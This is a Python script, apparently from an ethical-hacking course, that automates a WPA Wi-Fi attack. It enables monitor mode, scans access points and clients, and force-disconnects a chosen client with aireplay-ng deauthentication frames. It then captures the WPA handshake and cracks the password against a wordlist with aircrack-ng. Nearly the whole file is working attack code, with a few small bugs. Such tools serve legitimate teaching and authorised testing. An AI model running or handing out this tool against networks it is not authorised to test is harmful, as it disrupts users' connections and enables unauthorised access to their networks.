import sys, os, subprocess, shutil
import argparse
from argparse import ArgumentParser
import tempfile
import atexit
# import pandas
import time


###############################################################
# Specify directory to store temporary intercepted packets
# Default: Creates directory "./packets"
packetPath = ""

# Specify path to custom dictionary for cracking
# Default: Uses included dictionary
dictionaryPath = ""

# Specify file to store passwords in
# Default: Creates file "passwords.txt"
passwordsPath = ""

# Specify interface name of the monitor-mode-capable device you
# would like to use.
# Default: Searches for monitor-mode-capable devices at runtime
interfaceName = ""

# Specify access point MAC address (BSSID) to target
# Default: Present user with detected access points to choose from
# routerBSSID = "10:BF:48:D3:93:B8" # CS378-EthicalHacking-GDC-2.212
routerBSSID = ""

# Specify channel to scan on
# Default: Prompt user to choose channel or scan all channels
# channel = "6"
channel = ""
###############################################################


def main():
	if not os.geteuid() == 0:
		sys.exit('Please run as root')
	try:
		environmentSetup()
		killInterference()
		while routerBSSID == "" or channel == "":
			getTargetAccessPoint()
		captureHandshake()
		crackHandshake()
	finally:
		# this ensures that clean up occurs even on error
		cleanUp()

def is_valid_path(parser, arg):
    if not os.path.exists(arg):
        parser.error("The path %s does not exist!" % arg)


def bash_command(cmd, debug=False):
	if debug:
		process = subprocess.Popen(['/bin/bash', '-c', cmd])
	else:
		process = subprocess.Popen(['/bin/bash', '-c', cmd],
				stdout=subprocess.PIPE,
				stderr=subprocess.PIPE)
	return process


class readable_dir(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        prospective_dir=values
        if not os.path.isdir(prospective_dir):
            raise argparse.ArgumentTypeError("readable_dir:{0} is not a valid path".format(prospective_dir))
        if os.access(prospective_dir, os.R_OK):
            setattr(namespace,self.dest,prospective_dir)
        else:
            raise argparse.ArgumentTypeError("readable_dir:{0} is not a readable dir".format(prospective_dir))


def environmentSetup():
	global packetPath
	global dictionaryPath
	global passwordsPath
	global interfaceName

	# Prep ArgumentParser
	# ldir = tempfile.mkdtemp()
	# atexit.register(lambda dir=ldir: shutil.rmtree(ldir))

	# parser = ArgumentParser(description='test', fromfile_prefix_chars="@")
	# parser.add_argument('--packetPath', action=readable_dir, default=ldir)
	# parser.add_argument('--dictionaryPath', action=readable_dir, default=ldir) # How will this work?
	# parser.add_argument('--passwordsPath', action=readable_dir, default=ldir)
	# args = parser.parse_args()

	# read args, if any
	args = list(sys.argv)
	for i, arg in enumerate(args):
		if i == 0:
			continue
		setGlobalAttribute(arg)

	''' The following if statements will only execute if the user
	user did NOT specify that particular attribute either global (in this file)
	or via the commandline. '''
	# use default path for packets	
	if not packetPath:
		# create packets directory if it doesn't exist
		if not os.path.exists(os.getcwd() + "/packets"):
			os.makedirs(os.getcwd() + "/packets")
		packetPath = os.getcwd() + "/packets/"
	# use included dictionary
	if not dictionaryPath and os.path.isfile(os.getcwd() + "/dictionary.txt"):
		dictionaryPath = os.getcwd() + "/dictionary.txt"
	# use default passwords file
	if not passwordsPath and os.path.isfile(os.getcwd() + "/passwords.txt"):
		# TODO: Make passwords.txt file if there isn't one
		passwordsPath = os.getcwd() + "/passwords.txt"

	# get interfaceName
	# getInterfaceName() should raise exception if no compatible device found
	if interfaceName == '':
		print("Listing interfaces...")
		interfaceName = getInterfaceName()

def killInterference():
	print("Killing potential interfering processes...")
	process = bash_command("airmon-ng check kill")
	print(process.stdout.read().decode('utf-8').strip())
	# TODO: Handle error output

	print("Stopping avahi-daemon...")
	process = bash_command("/etc/init.d/avahi-daemon stop")
	print(process.stdout.read().decode('utf-8'))
	# TODO: Handle error output

	# TODO: Check for eth0 interface
	# TODO: Is this necessary?
	# Use 'ifconfig'
	print("Taking your eth0 down...")
	process = bash_command("ifconfig eth0 down")
	print(process.stdout.read().decode('utf-8'))
	# TODO: Handle error output


def setGlobalAttribute(arg):
	attributeAndPath = arg.split('=')
	attribute = attributeAndPath[0]
	path = attributeAndPath[1]

	if not os.path.exists(path):
		raise ValueError("Path not found: " + path)

	if attribute == 'packetPath':
		packetPath = path
	elif attribute == 'dictionaryPath':
		dictionaryPath = path
	elif attribute == 'passwordsPath':
		passwordsPath = path
	else:
		raise ValueError("Invalid argument: " + attribute)


def getTargetAccessPoint():
	''' airdump setup '''
	global interfaceName
	global channel
	global routerBSSID

	while True:
		while channel == '':
			user_input = input("Channel number to listen to (0 to scan multiple): ")
			if user_input.isdigit() and 0 <= int(user_input) <= 14:
				channel = int(user_input)
		scanAccessPoints(interfaceName, channel)
		result = input("Start new scan? (y=yes): ")
		if result == 'y' or result == 'yes' or result == '1':
			continue
		else:
			break

	# Get MAC address of the target access point (router)
	routerBSSID = input("Please select access point MAC address (BSSID 1): ")


def scanAccessPoints(interfaceName, channel):
	# Allow user to select an AP (access point) by MAC address
	print("Listing access points close to user's location...")

	# Specify how long to run scan
	scanTime = ''
	while not scanTime.isdigit():
		user_input = input("Time limit to listen: ")
		scanTime = user_input

	# if channel is specified, limit scan to given channel
	if int(channel) > 0:
		airodump = bash_command("airodump-ng" +
				" -c " + str(channel) +
				" --output-format csv" +
				" -w " + packetPath + "dump" +
				" " + interfaceName)
	else:
		airodump = bash_command("airodump-ng" +
				" --output-format csv" +
				" -w " + packetPath + "dump" +
				" " + interfaceName)
	time.sleep(int(scanTime))
	airodump.terminate()
	print("Scan complete.")


def getInterfaceName():
	# get physical names and their corresponding device names
	phyToInterface = {}
	output = bash_command("iw dev").stdout.read().decode('utf-8').splitlines()
	for i, line in enumerate(output):
		if line.startswith('phy'):
			phyToInterface[output[i].strip().replace('#','')] = output[i+1].split()[1]

	# find out what modes each device supports
	modes = {}
	for phy in phyToInterface.keys():
		i=0
		# call "iw <dev> info"
		output = bash_command("iw "+phy+" info").stdout.read().decode('utf-8').splitlines()
		# read indented block following "Supported interface modes:" line
		while i<len(output):
			if output[i].strip() == "Supported interface modes:":
				modes[phy] = []
				level = len(output[i]) - len(output[i].lstrip('\t'))
				i+=1
				while (len(output[i]) - len(output[i].lstrip('\t'))) > level:
					modes[phy].append(output[i].strip())
					i += 1
			i+=1

	# count how many devices support monitor mode
	compatibleDevices = sorted([phy for phy in modes.keys() if any("monitor" in s for s in modes[phy])])

	# check if there are 1 or fewer compatible devices
	chosenDevice = None
	if len(compatibleDevices) == 0:
		print("No compatible wireless devices found.")
	elif len(compatibleDevices) == 1:
		print("Found one compatible wireless device: " +
			compatibleDevices[0] + " : " + phyToInterface[compatibleDevices[0]])
		chosenDevice = compatibleDevices[0]

	# ask the user to choose a wireless interface
	while chosenDevice == None:
		for i, phy in enumerate(compatibleDevices):
			print("\t[{}] {:5} : {}".format(str(i), phy, phyToInterface[phy]))

		choice = input(str(len(compatibleDevices)) + " compatible wireless devices found. Please choose: ")
		if choice.isdigit() and (0 <= int(choice) < len(compatibleDevices)):
			chosenDevice = compatibleDevices[int(choice)]
		else:
			print(choice + " is an invalid option, please try again.\n")

	# enable monitor mode on interface for chosen device
	print("Enabling monitor mode on " + phyToInterface[chosenDevice] + "...")
	process = bash_command("airmon-ng start " + phyToInterface[chosenDevice])
	# wait for airmon-ng to complete
	process.communicate(timeout=10)

	# update interface names for devices
	output = bash_command("iw dev").stdout.read().decode('utf-8').splitlines()
	for i, line in enumerate(output):
		phy = line.strip().replace('#','')
		if phy == chosenDevice:
			interface = output[i+1].split()[1]
			if interface != phyToInterface[chosenDevice]:
				phyToInterface[phy] = interface
				print("Updated interface name: " + phyToInterface[chosenDevice])

	return phyToInterface[chosenDevice]


def captureHandshake():
	global routerBSSID
	global interfaceName

	clientBSSID = scanClientsForAccessPoint()
	airodump_proc = bash_command("airodump-ng" +
			" -c " + str(channel) +
			" --bssid " + str(routerBSSID) +
			" --output-format cap" +
			" -w " + packetPath + "packet" +
			" " + str(interfaceName))
	time.sleep(2)
	deauthenticateClient(clientBSSID)
	time.sleep(8)
	airodump_proc.terminate()


def scanClientsForAccessPoint(routerESSID=None):
	global routerBSSID
	global channel
	global interfaceName

	print("Using interface: " + interfaceName)

	# Allow user to select an AP (access point) by MAC address
	if routerESSID == None or routerESSID == '':
		print("Scanning clients connected to access point " + routerBSSID + "...")
	else:
		print("Scanning clients connected to access point " + routerESSID + "...")

	# List all clients connected to target AP
	scanTime = ''
	while not scanTime.isdigit():
		scanTime = input("Time limit to listen: ")
	process = bash_command("airodump-ng -c " + str(channel) + " --bssid " + str(routerBSSID) + " " + str(interfaceName), debug=True)
	time.sleep(int(scanTime))
	process.terminate()

	# Have user select client to use
	# TODO: Automatically select a client to use
	# TODO: Allow for option to choose strongest
	# colnames = ['BSSID', 'ESSID']
	# accessPoints = pandas.read_csv('dump-01.csv', names=colnames)
	# bssids = accessPoints.BSSID.tolist()
	# essids = accessPoints.ESSID.tolist()
	# print(bssids)
	# print("\n\n" + essids)
	clientBSSID = input("Please select client (BSSID 2) to deauthenticate: ")
	# TODO: Parse input - insert colon delimiters, make all-caps?

	return clientBSSID


def deauthenticateClient(clientBSSID, routerESSID=None):
	global routerBSSID
	global interfaceName
	global channel

	if routerESSID == None or routerESSID == '':
		print("Deauthenticating client " + clientBSSID + " at AP " + routerBSSID)
	else:
		print("Deauthenticating client " + clientBSSID + " at AP " + routerESSID)

	aireplay_proc = bash_command("aireplay-ng -0 1 -a " + routerBSSID + " -c " + clientBSSID + " " + interfaceName)
	print(aireplay_proc.stdout.read().decode('utf-8').strip())


def crackHandshake():
	global routerBSSID, dictionaryPath
	if dictionaryPath == "":
		process = bash_command("ls")
		print(process.stdout.read().decode('utf-8'))
		dictionaryPath = input("Please specify wordlist for dictionary crack: ")
	print("aircrack-ng -w " + dictionaryPath + " -b " + routerBSSID + " " + packetPath + "packet-01.cap")
	process = bash_command("aircrack-ng -w " + dictionaryPath + " -b " + routerBSSID + " packet-01.cap")
	print(process.stdout.read().decode('utf-8'))

def cleanUp():
	if os.path.exists(packetPath):
		shutil.rmtree(packetPath)

if __name__ == "__main__":
	main()

